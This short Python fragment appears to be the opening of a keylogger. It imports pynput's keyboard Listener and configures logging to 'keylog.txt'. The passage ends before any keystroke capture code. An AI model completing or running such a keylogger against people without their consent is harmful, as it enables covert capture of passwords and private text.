# Import necessary modules
from pynput.keyboard import Key, Listener  # Import Key and Listener from pynput.keyboard
import logging  # Import the logging module

# Configure logging settings
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
# Set up logging to a file named "keylog.txt", capturing messages of DEBUG level and higher,
# with a specific format including timestamp and log message.